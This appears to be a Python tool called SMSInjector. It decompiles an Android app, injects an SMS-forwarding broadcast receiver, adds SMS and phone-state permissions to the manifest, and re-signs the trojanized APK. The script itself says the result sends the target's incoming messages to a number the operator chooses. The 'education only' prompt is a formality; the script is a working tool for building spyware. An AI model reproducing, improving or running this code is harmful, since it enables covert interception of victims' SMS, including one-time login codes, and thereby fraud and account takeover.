
#! /usr/bin/env python3
import os, sys, time, fileinput
from os import path, kill, mkdir
from getpass import getpass
import re


r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"

apnd_apk = ""
apnd_no =  ""
app_name=""


path_to_script = path.dirname(path.realpath(__file__))
SMALI = f'{path_to_script}/sms/smshacker/SMSHacker.smali'

def banner():
    print(y+"""     
     $____$$___________$$____$
____$$____$$____________$$___$$
____$$___$$_____________$$____$
___$$____$$____$___$____$$____$$
___$$____$$____$$$$$____$$____$$
___$$___$$$___$$$$$$$___$$$___$$
__$$$___$$$___$$$$$$$___$$$___$$$
__$$$___$$$___$$$$$$$___$$$___$$$
__$$$___$$$____$$$$$____$$$___$$$
__$$$____$$$___$$$$$___$$$___$$$$
   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$""")
    print(y+"""      SMSINJECTOR - version 1.0 
      $$$$$$$$$$$$$$$$$$$$$$$$$
_$$$$$$$$$$_$$$$$$$$$$$_$$$$$$$$$$
$$$$   $$$__$$$$$$$$$$$__$$$___$$$$
$$$____$$$__$$$$$$$$$$$__$$$____$$$
_$$$___$$$__$$$$$$$$$$$__$$$___$$$
_$$$___$$$__$$$$$$$$$$$__$$$___$$$
__$$____$$___$$$$$$$$$___$$____$$
__$$$___$$___$$$$$$$$$___$$___$$$
___$$____$$___$$$$$$$___$$____$$
____$$____$____$$$$$____$____$$
_____$_____$___________$_____$
______$____$___________$____$ """)

    print(w+"SMSInjector - version 1.0")
    print(w+"Author by "+y+"@emrechakar")


def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Failed to write in file "+file)
        
def start():
    global apnd_apk,app_name

    os.system("clear")
    banner()
    print(r+"[!]"+w+" please use for education only!!!")
    ask = str(input(r+"[!]"+w+" do you confirm?  (y/n): ").lower())
    if ask in ("yes"): pass
    else: exit(r+"[!]"+w+" Dont be evil !")
    print(f"""
    {r}SMSIncjector{w} It injects an sms broadcast receiver into any playstore app.
    {w}In this way, when the target uses this application, incoming sms will be sent to the number you specify..
    {d}please use for education only!{w}
    """)
    while True:
        x = str(input(w+"* Enter the number you want the SMS forwarded to: "+g))
        if len(x) != 0:
            apnd_no = x
            os.system("sed -i 's/enter_number/"+x+"/' SMSHacker.smali")
            os.system("cp ./SMSHacker.smali ./sms/smshacker")
            break
        else: continue

    while True:
        y = str(input(w+"* please just add apk file. (eg: /root/Desktop/test.apk) (JUST APK): "+g))
        x = str(input(w+"* SET app_name (eg:test): "+g))
        if len(x) != 0:
            app_name = x
        if os.path.isfile(y):
            if ".apk" in y:
                apnd_apk = y
                
                
                os.system("apktool d "+apnd_apk+ " -o base")   
             
                os.system("cp -R sms/smshacker/  base/smali/com/")
                array = [

                "READ_PHONE_STATE",
                "SEND_SMS",
                "RECEIVE_SMS",
                ]
                

                with open('base/AndroidManifest.xml', 'r') as fp:
                	Lines = fp.readlines()
                for Line in Lines:
                	if 'android.permission' in Line:
                    		perm = re.findall(r'android\.permission\.([^"]+)', Line)[0]
                    		if perm not in array:
                    			array.append(perm)
                i = 0
                written = False
                fp = open('base/AndroidManifest.xml', 'w')
                while i < len(Lines):
                	if 'uses-permission' in Lines[i]:
                    		if not written:
                    			for perm in array:
                        			fp.write(f'\t<uses-permission android:name="android.permission.{perm}"/>\n')
                    			written = True
                    		i+=1
                    		continue
                	fp.write(Lines[i])
                	i+=1
                fp.close()
                print(w+b+"(PLEASE COPY THE TEXT CONTENT FROM THE FILE TO BE OPENED NOW) ")
                auth1=str(input("If you approve, continue. (y/n): ").lower())
                if auth1 in ("yes"): pass
                else: exit(r+"[!]"+w+" NO APPROVAL!!!")
                time.sleep(2)
                os.system("mousepad intents.txt")
                auth2=str(input("Please continue if the copy operation completed successfully (y/n): ").lower())
                if auth2 in("yes"): pass 
                time.sleep(2)
                print("Copy this part into AndroidManifest.xml within <application> tag and before  first <activity> tag and save file (CTRL+S)")
                auth=str(input("If you approve, continue (y/n): ").lower())
                if auth in ("yes"): pass
                else: exit(r+"[!]"+w+" NO APPROVAL!! !")
                
                

                time.sleep(2)
                os.system("mousepad base/AndroidManifest.xml")
                auth2=str(input("Please continue if the copy operation completed successfully (y/n): ").lower())
                if auth2 in("yes"): pass
                else: exit(r+"[!]"+w+" ONAY YOK!! !")
                
                
                
                os.system("apktool b base -o final.apk;rm -rf base")
                os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
                os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
                os.system("rm -rf final.apk")
                if os.path.isfile("final-aligned-signed.apk"):
                    
                    out = app_name.replace(" ","").lower() + ".apk"
                    os.system("mv final-aligned-signed.apk "+out)
                    getpass(b+">"+w+" Result saved as: "+B+" "+out+" "+w)
                else: print(r+"[!]"+w+" Failed to signed APK's")

              
            else: print(r+"[!]"+w+" please enter only apk file!")
        else: print(r+"[!]"+w+" file not found !")
        print(w+"* Building your APK's ...")
    print(w+"-"*43+d)








    


if __name__ == "__main__":

    try:
        start()
    except KeyboardInterrupt:
        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    follow us \033[4mhttps://github.com/emrechakar\033[0m\n    exiting ...")
